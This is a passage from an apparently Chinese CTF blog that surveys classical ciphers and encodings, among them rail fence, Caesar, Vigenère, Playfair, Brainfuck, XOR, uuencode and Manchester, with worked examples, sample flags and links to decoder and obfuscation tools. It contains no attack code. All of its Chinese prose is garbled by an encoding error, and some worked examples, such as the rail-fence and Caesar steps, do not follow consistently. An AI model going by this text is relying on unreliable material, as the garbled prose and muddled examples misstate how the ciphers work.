<h3 id="JsFuckåœ¨çº¿è§£å¯†"><a href="#JsFuckåœ¨çº¿è§£å¯†" class="headerlink" title="JsFuckåœ¨çº¿è§£å¯†"></a><a href="http://www.jsfuck.com/" target="_blank" rel="external">JsFuckåœ¨çº¿è§£å¯†</a></h3><h1 id="0x06-æ …æ å¯†ç "><a href="#0x06-æ …æ å¯†ç " class="headerlink" title="0x06 æ …æ å¯†ç "></a>0x06 æ …æ å¯†ç </h1><p>æ‰€è°“æ …æ å¯†ç ï¼Œå°±æ˜¯æŠŠè¦åŠ å¯†çš„æ˜æ–‡åˆ†æˆNä¸ªä¸€ç»„ï¼Œç„¶åæŠŠæ¯ç»„çš„ç¬¬1ä¸ªå­—è¿èµ·æ¥ï¼Œå½¢æˆä¸€æ®µæ— è§„å¾‹çš„è¯ã€‚ ä¸è¿‡æ …æ å¯†ç æœ¬èº«æœ‰ä¸€ä¸ªæ½œè§„åˆ™ï¼Œå°±æ˜¯ç»„æˆæ …æ çš„å­—æ¯ä¸€èˆ¬ä¸ä¼šå¤ªå¤šã€‚ï¼ˆä¸€èˆ¬ä¸è¶…è¿‡30ä¸ªï¼Œä¹Ÿå°±æ˜¯ä¸€ã€ä¸¤å¥è¯ï¼‰</p>
<h2 id="ä¾‹å¦‚-2"><a href="#ä¾‹å¦‚-2" class="headerlink" title="ä¾‹å¦‚"></a>ä¾‹å¦‚</h2><pre><code>æ˜æ–‡ï¼šTHERE IS A CIPHER
å»æ‰ç©ºæ ¼åå˜ä¸ºï¼šTHEREISACIPHER
ä¸¤ä¸ªä¸€ç»„ï¼Œå¾—åˆ°ï¼šTH ER EI SA CI PH ER
å…ˆå–å‡ºç¬¬ä¸€ä¸ªå­—æ¯ï¼šTEESCPE
å†å–å‡ºç¬¬äºŒä¸ªå­—æ¯ï¼šHRIAIHR
è¿åœ¨ä¸€èµ·å°±æ˜¯ï¼šTEESCPEHRIAIHR
è¿˜åŸä¸ºæ‰€éœ€å¯†ç ã€‚
è€Œè§£å¯†çš„æ—¶å€™ï¼Œæˆ‘ä»¬å…ˆæŠŠå¯†æ–‡ä»ä¸­é—´åˆ†å¼€ï¼Œå˜ä¸ºä¸¤è¡Œï¼š
T E E S C P E
H R I A I H R
å†æŒ‰ä¸Šä¸‹ä¸Šä¸‹çš„é¡ºåºç»„åˆèµ·æ¥ï¼š
THEREISACIPHER
åˆ†å‡ºç©ºæ ¼ï¼Œå°±å¯ä»¥å¾—åˆ°åŸæ–‡äº†ï¼š
THERE IS A CIPHER

ä¾‹å¦‚å¯†æ–‡ï¼šNlEyQd{seft}
N l 
E y 
Q d 
{ s 
e f
 t }
NEQ{etIydsf}
</code></pre><p>pythonå®ç°æ …æ è§£å¯†ï¼š<a href="http://oa8y5guqs.bkt.clouddn.com/zhalan.py" target="_blank" rel="external">zhalan.py</a></p>
<h1 id="0x07-å‡¯æ’’å¯†ç "><a href="#0x07-å‡¯æ’’å¯†ç " class="headerlink" title="0x07 å‡¯æ’’å¯†ç "></a>0x07 å‡¯æ’’å¯†ç </h1><p>å®ƒçš„åŸºæœ¬æ€æƒ³æ˜¯ï¼šé€šè¿‡æŠŠå­—æ¯ç§»åŠ¨ä¸€å®šçš„ä½æ•°æ¥å®ç°åŠ å¯†å’Œè§£å¯†ã€‚æ˜æ–‡ä¸­çš„æ‰€æœ‰å­—æ¯éƒ½åœ¨å­—æ¯è¡¨ä¸Šå‘åï¼ˆæˆ–å‘å‰ï¼‰æŒ‰ç…§ä¸€ä¸ªå›ºå®šæ•°ç›®è¿›è¡Œåç§»åè¢«æ›¿æ¢æˆå¯†æ–‡ã€‚</p>
<p>##ä¾‹å¦‚</p>
<blockquote>
<p>å½“åç§»é‡æ˜¯3çš„æ—¶å€™ï¼Œæ‰€æœ‰çš„å­—æ¯Aå°†è¢«æ›¿æ¢æˆDï¼ŒBå˜æˆEï¼Œä»¥æ­¤ç±»æ¨Xå°†å˜æˆAï¼ŒYå˜æˆBï¼ŒZå˜æˆCã€‚ç”±æ­¤å¯è§ï¼Œä½æ•°å°±æ˜¯å‡¯æ’’å¯†ç åŠ å¯†å’Œè§£å¯†çš„å¯†é’¥ã€‚</p>
</blockquote>
<p>è§£å¯†å‚ç…§å‡¯æ’’å¯†ç è¡¨ï¼š<br><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81%E8%A1%A8.png" alt=""></p>
<pre><code>ä¸Šè¿°çš„å¯†æ–‡ï¼šNEQ{etIydsf}
å‘ç°ç§»ä½11
CTF{tianshu}
</code></pre><p>pythonå®ç°å‡¯æ’’è§£å¯†ï¼š<a href="http://oa8y5guqs.bkt.clouddn.com/kaisa.py" target="_blank" rel="external">kaisa.py</a></p>
<h1 id="0x08-ç»´å‰åˆ©äºšå¯†ç "><a href="#0x08-ç»´å‰åˆ©äºšå¯†ç " class="headerlink" title="0x08 ç»´å‰åˆ©äºšå¯†ç "></a>0x08 ç»´å‰åˆ©äºšå¯†ç </h1><p>æºæ’’å¯†ç çš„åŸºç¡€ä¸Šæ‰©å±•çš„å¤šè¡¨å¯†ç .</p>
<h2 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h2><pre><code>å¦‚æœä½ è¦å¯¹è‡ªå·±çš„ç”·ï¼ˆå¥³ï¼‰ç¥ç”¨ç»´å¯†ï¼ˆä¸æ˜¯ç»´å¤šåˆ©äºšçš„ç§˜å¯†ï¼‰è¡¨ç™½ï¼Œå…ˆå†™å¥½æ˜æ–‡ï¼šI LOVE YOU
ç„¶åè‡ªå·±è®¾å®šä¸€ä¸ªå¯†é’¥ï¼Œæ¯”å¦‚ï¼šKISSã€‚
è¿™æ ·å¯†é’¥ä¸æ˜æ–‡å¯¹åº”å°±æ˜¯
K ISSK ISS
I LOVE YOU

å¯¹ç¬¬ä¸€ä¸ªå­—æ¯â€œIâ€åŠ å¯†è¿‡ç¨‹å¦‚ä¸‹ï¼š
å…ˆæ‰¾åˆ°æœ€å·¦ä¾§å¯†é’¥Kæ‰€åœ¨çš„ä¸€è¡Œå’Œæœ€ä¸Šæ–¹æ˜æ–‡Iæ‰€åœ¨åˆ—ï¼Œæ‰¾åˆ°ä»–ä»¬çš„ç›¸äº¤å­—æ¯Sï¼Œè¿™æ ·Iå°±è¢«åŠ å¯†æˆäº†Sã€‚
åŒç†ï¼Œè¿™å¥è¯é€šè¿‡æ¯ä¸€ä¸ªå¯¹åº”å¯†é’¥çš„åŠ å¯†åå°±å˜æˆå¦‚ä¸‹
å¯†é’¥ï¼šKISSKISS
æ˜æ–‡ï¼šILOVEYOU
å¯†æ–‡ï¼šSTGNOGGM
</code></pre><p>ç»´å‰åˆ©äºšå¯†ç è¡¨ï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E7%BB%B4%E5%90%89%E5%88%A9%E4%BA%9A%E5%AF%86%E7%A0%81%E8%A1%A8.png.jpg" alt=""></p>
<p><a href="http://oa8y5guqs.bkt.clouddn.com/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%B7%A5%E5%85%B7.zip" target="_blank" rel="external">ç»´å‰åˆ©äºšåŠ è§£å¯†å·¥å…·</a></p>
<h1 id="0x09-Unicodeç¼–ç "><a href="#0x09-Unicodeç¼–ç " class="headerlink" title="0x09 Unicodeç¼–ç "></a>0x09 Unicodeç¼–ç </h1><p>Unicodeï¼ˆç»Ÿä¸€ç ã€ä¸‡å›½ç ã€å•ä¸€ç ï¼‰æ˜¯è®¡ç®—æœºç§‘å­¦é¢†åŸŸé‡Œçš„ä¸€é¡¹ä¸šç•Œæ ‡å‡†,åŒ…æ‹¬å­—ç¬¦é›†ã€ç¼–ç æ–¹æ¡ˆç­‰ã€‚ç›®å‰å¸¸ç”¨çš„æœ‰UTF-8ã€UTF-16ã€UTF-32ã€‚</p>
<h3 id="å¯†æ–‡å½¢å¼ï¼š"><a href="#å¯†æ–‡å½¢å¼ï¼š" class="headerlink" title="å¯†æ–‡å½¢å¼ï¼š"></a>å¯†æ–‡å½¢å¼ï¼š</h3><blockquote>
<p>\u5927\u5bb6\u597d\uff01\u000d\u000a</p>
</blockquote>
<p><a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="external">Unicodeåœ¨çº¿è§£å¯†</a></p>
<h1 id="0x10-brainfuckç¼–ç "><a href="#0x10-brainfuckç¼–ç " class="headerlink" title="0x10 brainfuckç¼–ç "></a>0x10 brainfuckç¼–ç </h1><p>Brainfuckæ˜¯ä¸€ç§æå°åŒ–çš„è®¡ç®—æœºè¯­è¨€ï¼Œå®ƒæ˜¯ç”±Urban MÃ¼lleråœ¨1993å¹´åˆ›å»ºçš„ã€‚ç”±äºfuckåœ¨è‹±è¯­ä¸­æ˜¯è„è¯ï¼Œè¿™ç§è¯­è¨€æœ‰æ—¶è¢«ç§°ä¸ºbrainf<em>ckæˆ–brainf*</em>kï¼Œç”šè‡³è¢«ç®€ç§°ä¸ºBFã€‚<br>å…±æœ‰å…«ä¸ªå­—ç¬¦</p>
<pre><code>å­—ç¬¦å«ä¹‰ï¼š
&gt;    æŒ‡é’ˆåŠ ä¸€
&lt;    æŒ‡é’ˆå‡ä¸€
+    æŒ‡é’ˆæŒ‡å‘çš„å­—èŠ‚çš„å€¼åŠ ä¸€
-    æŒ‡é’ˆæŒ‡å‘çš„å­—èŠ‚çš„å€¼å‡ä¸€
.    è¾“å‡ºæŒ‡é’ˆæŒ‡å‘çš„å•å…ƒå†…å®¹ï¼ˆASCâ…¡ç ï¼‰
,    è¾“å…¥å†…å®¹åˆ°æŒ‡é’ˆæŒ‡å‘çš„å•å…ƒï¼ˆASCâ…¡ç ï¼‰
[    å¦‚æœæŒ‡é’ˆæŒ‡å‘çš„å•å…ƒå€¼ä¸ºé›¶ï¼Œå‘åè·³è½¬åˆ°å¯¹åº”çš„]æŒ‡ä»¤çš„æ¬¡ä¸€æŒ‡ä»¤å¤„
]    å¦‚æœæŒ‡é’ˆæŒ‡å‘çš„å•å…ƒå€¼ä¸ä¸ºé›¶ï¼Œå‘å‰è·³è½¬åˆ°å¯¹åº”çš„[æŒ‡ä»¤çš„æ¬¡ä¸€æŒ‡ä»¤å¤„
</code></pre><h3 id="å¯†æ–‡å½¢å¼"><a href="#å¯†æ–‡å½¢å¼" class="headerlink" title="å¯†æ–‡å½¢å¼:"></a>å¯†æ–‡å½¢å¼:</h3><pre><code>++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]
&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.
&gt;.+++.------.--------.&gt;+.&gt;.
</code></pre><h3 id="è§£å¯†æ–¹æ³•"><a href="#è§£å¯†æ–¹æ³•" class="headerlink" title="è§£å¯†æ–¹æ³•"></a>è§£å¯†æ–¹æ³•</h3><ul>
<li><p>ä½¿ç”¨brainfuckè§£é‡Šå™¨è§£å¯†</p>
<p>  bftools.exe Decode braincopter doge.jpg -o dogeout.png</p>
<p>  bftools.exe run dogeout.png</p>
<p>  Q1RGe0JyYWluZnVja18xc19TaW1wMWV9</p>
<p>  CTF{Brainfuck_1s_Simp1e}</p>
</li>
<li><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="external">brainfuckåœ¨çº¿è§£å¯†</a></li>
</ul>
<h1 id="0x11-Playfairç¼–ç "><a href="#0x11-Playfairç¼–ç " class="headerlink" title="0x11 Playfairç¼–ç "></a>0x11 Playfairç¼–ç </h1><p>Playfairå¯†ç å‡ºç°äº1854å¹´ï¼Œå®ƒä¾æ®ä¸€ä¸ª5*5çš„æ­£æ–¹å½¢ç»„æˆçš„å¯†ç è¡¨æ¥ç¼–å†™ï¼Œå¯†ç è¡¨é‡Œæ’åˆ—æœ‰25ä¸ªå­—æ¯ã€‚å¦‚æœä¸€ç§è¯­è¨€å­—æ¯è¶…è¿‡25ä¸ªï¼Œå¯ä»¥å»æ‰ä½¿ç”¨é¢‘ç‡æœ€å°‘çš„ä¸€ä¸ªã€‚å¦‚ï¼Œæ³•è¯­ä¸€èˆ¬å»æ‰wæˆ–kï¼Œå¾·è¯­åˆ™æ˜¯æŠŠiå’Œjåˆèµ·æ¥å½“æˆä¸€ä¸ªå­—æ¯çœ‹å¾…ã€‚è‹±è¯­ä¸­zä½¿ç”¨æœ€å°‘ï¼Œå¯ä»¥å»æ‰å®ƒã€‚</p>
<h3 id="åŠ å¯†æè¿°ï¼š"><a href="#åŠ å¯†æè¿°ï¼š" class="headerlink" title="åŠ å¯†æè¿°ï¼š"></a>åŠ å¯†æè¿°ï¼š</h3><pre><code>ç¬¬ä¸€æ­¥æ˜¯ç¼–åˆ¶å¯†ç è¡¨ã€‚åœ¨è¿™ä¸ª5*5çš„å¯†ç è¡¨ä¸­ï¼Œå…±æœ‰5è¡Œ5åˆ—å­—æ¯ã€‚
ç¬¬ä¸€åˆ—ï¼ˆæˆ–ç¬¬ä¸€è¡Œï¼‰æ˜¯å¯†é’¥,å…¶ä½™æŒ‰ç…§å­—æ¯é¡ºåºã€‚å¯†é’¥æ˜¯ä¸€ä¸ªå•è¯æˆ–è¯ç»„ï¼Œè‹¥æœ‰é‡å¤å­—æ¯ï¼Œå¯å°†åé¢é‡å¤çš„å­—æ¯å»æ‰ã€‚å½“ç„¶ä¹Ÿè¦æŠŠä½¿ç”¨é¢‘ç‡æœ€å°‘çš„å­—æ¯å»æ‰ã€‚
å¦‚ï¼šå¯†é’¥æ˜¯Live and learn,å»æ‰ååˆ™ä¸ºliveandrã€‚å¦‚æœå¯†é’¥è¿‡é•¿å¯å ç”¨ç¬¬äºŒåˆ—æˆ–è¡Œ
</code></pre><h3 id="ä¾‹å¦‚-3"><a href="#ä¾‹å¦‚-3" class="headerlink" title="ä¾‹å¦‚"></a>ä¾‹å¦‚</h3><pre><code>é¦–å…ˆplayfairçš„åŠ å¯†è¿‡ç¨‹ç”¨åˆ°ä¸€ä¸ª5x5çš„å­—æ¯çŸ©é˜µ,å®¹çº³26ä¸ªå­—æ¯ï¼Œå…¶ä¸­iå’ŒjæŒ¤åˆ°ä¸€ä¸ªæ ¼å­é‡Œï¼Œå­—æ¯å¡«å†™é¡ºåºå–
å†³äºå¯†é’¥ï¼ŒThe quick brown fox jumps over the lazy dog!æ—¢ç„¶å‡ºé¢˜è€…ä¸æ˜¯åœ¨è®²æ•…äº‹ï¼Œé‚£ï¼Œè¿™å¥å°±æ˜¯å¯†é’¥äº†å§
å°†ç©ºæ ¼å»æ‰ï¼Œç„¶åå¡«å…¥çŸ©é˜µé‡Œï¼Œé‡å¤å‡ºç°çš„å­—æ¯åªå¡«ä¸€æ¬¡ã€‚

å¡«å®Œåå¦‚ä¸‹è¡¨ï¼š
t   h   e   q   u
i/j  c   k   b   r
o   w   n   f   x
m   p   s   v   l
a   z   y   d   g
å¡«å®Œå¯†é’¥å‡ºç°çš„å­—æ¯åï¼Œè‹¥è¿˜æœ‰ç©ºä½™ï¼Œå°±å¡«å­—æ¯è¡¨ä¸­å‰©ä½™çš„å­—æ¯ï¼ˆæŒ‰å­—æ¯è¡¨é¡ºåºï¼‰
</code></pre><h3 id="åŠ å¯†è¿‡ç¨‹ï¼š"><a href="#åŠ å¯†è¿‡ç¨‹ï¼š" class="headerlink" title="åŠ å¯†è¿‡ç¨‹ï¼š"></a>åŠ å¯†è¿‡ç¨‹ï¼š</h3><pre><code>æŠŠæ˜æ–‡æŒ‰ä¸¤ä¸ªå­—æ¯ä¸€ç»„åˆ†ç»„ï¼Œæ¯”å¦‚helloå°±åˆ†æˆhe,lx,lo
ç›¸é‚»å­—æ¯ç›¸åŒçš„æƒ…å†µä¸‹ï¼Œä¸­é—´åŠ ä¸ªå¡«å……å­—æ¯x(æœ‰æ—¶å€™æ˜¯q)ï¼Œè‹¥æœ€åä¸€ä¸ªå­—æ¯æ²¡ç»„å‘˜ï¼Œä¹ŸåŠ ä¸ªå¡«å……å­—æ¯ã€‚
åŠ å¯†è§„åˆ™ï¼š
1ã€ä¸¤æ˜æ–‡å­—æ¯m1,m2åŒè¡Œï¼Œå¯†æ–‡å­—æ¯c1,c2åœ¨å®ƒä»¬å³è¾¹ï¼ŒåŒè¡Œå¾ªç¯ï¼Œæ¯”å¦‚huåŠ å¯†åæ˜¯etï¼›
2ã€m1,m2åŒåˆ—ï¼šc1,c2åœ¨å®ƒä»¬ä¸‹è¾¹ï¼ŒåŒåˆ—å¾ªç¯ï¼ŒhzåŠ å¯†åæ˜¯chï¼›
3ã€m1,m2ä¸åŒè¡Œåˆ—ï¼šc1,c2æ˜¯m1,m2 ç»„æˆçš„é•¿æ–¹å½¢çš„å¦ä¸¤ä¸ªé¡¶ç‚¹ï¼Œé¡ºåºæ˜¯c1ä¸m1åŒè¡Œï¼Œc2ä¸m2åŒè¡Œï¼ŒcdåŠ å¯†åæ˜¯bzï¼›
</code></pre><h3 id="è§£å¯†è¿‡ç¨‹ï¼š"><a href="#è§£å¯†è¿‡ç¨‹ï¼š" class="headerlink" title="è§£å¯†è¿‡ç¨‹ï¼š"></a>è§£å¯†è¿‡ç¨‹ï¼š</h3><pre><code>æœ‰äº†å¯†é’¥çŸ©é˜µï¼Œå°†åŠ å¯†è¿‡ç¨‹åè¿‡æ¥å°±è¡Œã€‚ihxoè§£å¯†å°±æ˜¯ctfx
 ihxo{smzdodcikmodcismzd}
ctfx{playfairisfairplay}
</code></pre><h1 id="0x12-urlcodeç¼–ç "><a href="#0x12-urlcodeç¼–ç " class="headerlink" title="0x12 urlcodeç¼–ç "></a>0x12 urlcodeç¼–ç </h1><p>UrlEncodeï¼šå°†å­—ç¬¦ä¸²ä»¥URLç¼–ç </p>
<p>è¿”å›å€¼ï¼šå­—ç¬¦ä¸²</p>
<p>å‡½æ•°ç§ç±»ï¼šç¼–ç å¤„ç†</p>
<h3 id="å½¢å¼ï¼š-1"><a href="#å½¢å¼ï¼š-1" class="headerlink" title="å½¢å¼ï¼š"></a>å½¢å¼ï¼š</h3><pre><code>%4d%54%45%35%43%6a%45%77%4d%51%6f%78%4d%44%67%4b%4f%54%6b%4b%4d%54%45%78%43%6a%45%77%4f%51%6f%78%4d%44%45%4b%4d%54%45%32%43%6a%45%78%4d%51%6f%78%4d%54%55%4b%4d%54%41%30%43%6a%45%77%4e%51%6f%78%4d%6a%45%4b%4f%54%63%4b%4d%54%45%77%43%6a%6b%34%43%6a%6b%33%43%6a%45%78%4e%41%3d%3d
</code></pre><h3 id="urlcodeåœ¨çº¿è§£å¯†"><a href="#urlcodeåœ¨çº¿è§£å¯†" class="headerlink" title="urlcodeåœ¨çº¿è§£å¯†"></a><a href="http://tool.chinaz.com/Tools/URLEncode.aspx" target="_blank" rel="external">urlcodeåœ¨çº¿è§£å¯†</a></h3><h1 id="0x13-Serpentç¼–ç "><a href="#0x13-Serpentç¼–ç " class="headerlink" title="0x13 Serpentç¼–ç "></a>0x13 Serpentç¼–ç </h1><p>Serpentï¼ˆèŸ’è›‡ï¼‰,å®ƒæ˜¯AESçš„ä¸€ä¸ªå€™é€‰ç®—æ³•,è¯¥ç®—æ³•ä½¿ç”¨256ä½çš„å¯†é’¥å¯¹128ä½çš„å†³æ•°æ®è¿›è¡ŒåŠ è§£å¯†;<br>æè¿°äº†Serpentçš„åŠ è§£å¯†è¿‡ç¨‹åŠå­å¯†é’¥ç”Ÿæˆè¿‡ç¨‹,åŒæ—¶å¯¹å…¶æ€§èƒ½ä½œäº†éƒ¨åˆ†é˜è¿°</p>
<h3 id="Serpentåœ¨çº¿è§£å¯†"><a href="#Serpentåœ¨çº¿è§£å¯†" class="headerlink" title="Serpentåœ¨çº¿è§£å¯†"></a><a href="http://tool.chacuo.net/cryptserpent" target="_blank" rel="external">Serpentåœ¨çº¿è§£å¯†</a></h3><h1 id="0x14-å¼‚æˆ–åŠ å¯†"><a href="#0x14-å¼‚æˆ–åŠ å¯†" class="headerlink" title="0x14 å¼‚æˆ–åŠ å¯†"></a>0x14 å¼‚æˆ–åŠ å¯†</h1><pre><code>å¼‚æˆ–çš„è¿ç®—æ–¹æ³•æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶è¿ç®—ï¼š
1^1=0
0^0=0
1^0=1
0^1=1

ä¸¤è€…ç›¸ç­‰ä¸º0,ä¸ç­‰ä¸º1.
</code></pre><h3 id="å½¢å¼ï¼š-2"><a href="#å½¢å¼ï¼š-2" class="headerlink" title="å½¢å¼ï¼š"></a>å½¢å¼ï¼š</h3><blockquote>
<p>ä¸€èˆ¬ä¸ºä¸€ä¸ªäºŒè¿›åˆ¶å­—ç¬¦ä¸²å’Œä¸€ä¸ªè‹±æ–‡å­—æ¯</p>
<h3 id="è§£å¯†è¿‡ç¨‹"><a href="#è§£å¯†è¿‡ç¨‹" class="headerlink" title="è§£å¯†è¿‡ç¨‹"></a>è§£å¯†è¿‡ç¨‹</h3><ul>
<li>å…ˆæŠŠå¯†é’¥è½¬åŒ–æˆäºŒè¿›åˆ¶</li>
<li>å†å’Œå¯†æ–‡å¼‚æˆ–</li>
</ul>
</blockquote>
<p>å¼‚æˆ–è§£å¯†ç®—æ³•ï¼š<a href="http://oa8y5guqs.bkt.clouddn.com/yihuo.py" target="_blank" rel="external">yihuo.py</a></p>
<h1 id="0x15-CRC32åŠ å¯†"><a href="#0x15-CRC32åŠ å¯†" class="headerlink" title="0x15 CRC32åŠ å¯†"></a>0x15 CRC32åŠ å¯†</h1><p>CRCæ ¡éªŒå®ç”¨ç¨‹åºåº“ åœ¨æ•°æ®å­˜å‚¨å’Œæ•°æ®é€šè®¯é¢†åŸŸï¼Œä¸ºäº†ä¿è¯æ•°æ®çš„æ­£ç¡®ï¼Œå°±ä¸å¾—ä¸é‡‡ç”¨æ£€é”™çš„æ‰‹æ®µã€‚åœ¨è¯¸å¤šæ£€é”™æ‰‹æ®µä¸­ï¼ŒCRCæ˜¯æœ€è‘—åçš„ä¸€ç§ã€‚CRCçš„å…¨ç§°æ˜¯å¾ªç¯å†—ä½™æ ¡éªŒã€‚<br>CRCæ˜¯ç½‘ç»œä¼ è¾“ä¸­ç»å¸¸ç”¨çš„ä¸€ç§æ ¡éªŒæ–¹å¼ã€‚<br>å…¶ä¸­CRC32åˆ™æ˜¯é‡‡ç”¨è¿™æ ·çš„ä¸€ä¸ªå¤šé¡¹å¼ç”Ÿæˆå¼çš„CRCï¼š<br>Xe32+Xe26+Xe23+Xe22+Xe16+Xe12+Xe11+Xe10 +Xe8+Xe7+Xe5+Xe4+Xe2+X+1<br>( string$str )<br>ç”Ÿæˆstrçš„ 32 ä½å¾ªç¯å†—ä½™æ ¡éªŒç å¤šé¡¹å¼ã€‚è¿™é€šå¸¸ç”¨äºæ£€æŸ¥ä¼ è¾“çš„æ•°æ®æ˜¯å¦å®Œæ•´ã€‚</p>
<p><a href="http://blog.sina.com.cn/s/blog_64d75a250100i2qx.html" target="_blank" rel="external">pythonè®¡ç®—CRC32</a></p>
<h1 id="0x16-é‚®ä»¶ç¼–ç "><a href="#0x16-é‚®ä»¶ç¼–ç " class="headerlink" title="0x16 é‚®ä»¶ç¼–ç "></a>0x16 é‚®ä»¶ç¼–ç </h1><p>é‚®ä»¶ç¼–ç å³uuencodeç¼–ç ï¼Œæ˜¯å°†äºŒè¿›åˆ¶æ–‡ä»¶è½¬æ¢ä¸ºæ–‡æœ¬æ–‡ä»¶çš„è¿‡ç¨‹ï¼Œè½¬æ¢åçš„æ–‡ä»¶å¯ä»¥é€šè¿‡çº¯æ–‡æœ¬e-mailè¿›è¡Œä¼ è¾“ï¼Œåœ¨æ¥æ”¶æ–¹å¯¹è¯¥æ–‡ä»¶è¿›è¡Œuudecodeï¼Œå³å°†å…¶è½¬æ¢ä¸ºåˆå§‹çš„äºŒè¿›åˆ¶æ–‡ä»¶</p>
<h3 id="å½¢å¼ï¼š-3"><a href="#å½¢å¼ï¼š-3" class="headerlink" title="å½¢å¼ï¼š"></a>å½¢å¼ï¼š</h3><pre><code>MR,O)^KNYU&gt;;*Q[*[P_?#Q+&quot;AHZS6Q\G,LKNYNZ.LR;;2LK*[N^&amp;CK+/VN/;,

MXK:\TJJ]RKZAQ-36K:&amp;CH:,*M/.XQ;3PL+B^S&lt;K&apos;U&gt;+1^;#)=V-T9GMU=75U

*=65N8V]D95]??0``
</code></pre><p><a href="http://web.chacuo.net/charsetuuencode" target="_blank" rel="external">Uuencodeåœ¨çº¿è§£å¯†</a></p>
<h1 id="0x17-æ›¼åˆ‡æ–¯ç‰¹ç¼–ç "><a href="#0x17-æ›¼åˆ‡æ–¯ç‰¹ç¼–ç " class="headerlink" title="0x17 æ›¼åˆ‡æ–¯ç‰¹ç¼–ç "></a>0x17 æ›¼åˆ‡æ–¯ç‰¹ç¼–ç </h1><p>æ›¼å½»æ–¯ç‰¹ç¼–ç ï¼ˆManchester Encodingï¼‰ï¼Œä¹Ÿå«åšç›¸ä½ç¼–ç ï¼ˆ Phase Encodeï¼Œç®€å†™PEï¼‰ï¼Œæ˜¯ä¸€ä¸ªåŒæ­¥æ—¶é’Ÿç¼–ç æŠ€æœ¯ï¼Œè¢«ç‰©ç†å±‚ä½¿ç”¨æ¥ç¼–ç ä¸€ä¸ªåŒæ­¥ä½æµçš„æ—¶é’Ÿå’Œæ•°æ®ã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E6%9B%BC%E5%88%87%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81.jpg" alt=""></p>
<pre><code>ä»ä½åˆ°é«˜è·³å˜è¡¨ç¤º&quot;0&quot;ï¼Œä»é«˜åˆ°ä½è·³å˜è¡¨ç¤º&quot;1&quot;ã€‚
è¿˜æœ‰ä¸€ç§æ˜¯å·®åˆ†æ›¼å½»æ–¯ç‰¹ç¼–ç ï¼Œæ¯ä½ä¸­é—´çš„è·³å˜ä»…æä¾›æ—¶é’Ÿå®šæ—¶ï¼Œè€Œç”¨æ¯ä½å¼€å§‹æ—¶æœ‰æ— è·³å˜è¡¨ç¤º&quot;0&quot;æˆ–&quot;1&quot;ï¼Œæœ‰è·³å˜ä¸º&quot;0&quot;ï¼Œæ— è·³å˜ä¸º&quot;1&quot;ã€‚
å³:
0-1    è·³å˜è¡¨ç¤º 1,1-0 è·³å˜è¡¨ç¤º 0
ç„¶è€Œä¸€èˆ¬æ¥è¯´æ— çº¿è°ƒåˆ¶ä¸­ï¼Œä¼ æ„Ÿå™¨å’Œ RF å‰ç«¯ä¹‹å‰é€šä¿¡ä¸€èˆ¬ä¼šé‡‡ç”¨ SPI æ¥å£ï¼Œè€Œ SPI æ¥å£æœ‰ä¸¤ç§æ¨¡å¼ï¼Œ MSB First å’Œ LSB Firstï¼Œä¸€èˆ¬åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œéƒ½æ˜¯ MSB Firstï¼Œå¯æ˜¯è¿™é¢˜ä¸æ˜¯ï¼Œæœ‰ç‚¹å¥‡è‘©ï¼Œè¿™é¢˜æ˜¯ LSB First
</code></pre><h1 id="0x18-å…¶ä»–åŠ å¯†"><a href="#0x18-å…¶ä»–åŠ å¯†" class="headerlink" title="0x18 å…¶ä»–åŠ å¯†"></a>0x18 å…¶ä»–åŠ å¯†</h1><p><a href="http://baike.baidu.com/link?url=R6oWhCdKvzlG8hB4hdIdUT1cZPbFOCrpU6lJAkTtdiKodD7eRTbASpd_YVfi4LMl7N8yFyhVNOz5ki6TC7_5eq" target="_blank" rel="external">å¸Œå°”å¯†ç </a></p>
<p><a href="http://baike.baidu.com/view/10613.htm?fromtitle=RSA&amp;fromid=210678&amp;type=syn" target="_blank" rel="external">RasåŠ å¯†</a></p>
<p><a href="http://rot13.de/" target="_blank" rel="external">Rot13åŠ å¯†</a></p>
<p><a href="http://baike.baidu.com/link?url=yN39kWG2pGd9XHo3RjeUAbd7xs0QlnJ2uHzCJfxC03V-fJcQUdfcJ-WuGoAkKGFVE0AxFK4-98wa4FtzvxRA0_" target="_blank" rel="external">çŒªåœˆå¯†ç </a></p>
<p><a href="http://tieba.baidu.com/p/2027781907" target="_blank" rel="external">å½“é“ºå¯†ç </a></p>
<p><a href="http://tieba.baidu.com/p/2027781907" target="_blank" rel="external">æ‰‹æœºç”µè„‘é”®ç›˜å¯†ç </a></p>
<p><a href="http://tool.chinaz.com/Tools/Escape.aspx" target="_blank" rel="external">EscapeåŠ å¯†</a></p>
<h3 id="æ··æ·†åŠ å¯†"><a href="#æ··æ·†åŠ å¯†" class="headerlink" title="æ··æ·†åŠ å¯†"></a>æ··æ·†åŠ å¯†</h3><p><a href="http://www.zhaoyuanma.com/aspfix.html" target="_blank" rel="external">Aspæ··æ·†åŠ å¯†</a></p>
<p><a href="http://www.zhaoyuanma.com/phpcodefix.html" target="_blank" rel="external">Phpæ··æ·†åŠ å¯†</a></p>
<p><a href="http://tool.css-js.com/" target="_blank" rel="external">Css/jsæ··æ·†åŠ å¯†</a></p>
<p><a href="http://www.zhaoyuanma.com/aspfix.html" target="_blank" rel="external">VBScript.Encodeæ··æ·†åŠ å¯†:</a></p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> åŠ å¯†è§£å¯† </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ä¸Šä¼ æ¼æ´æ€»ç»“]]></title>
      <url>/2016/05/11/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
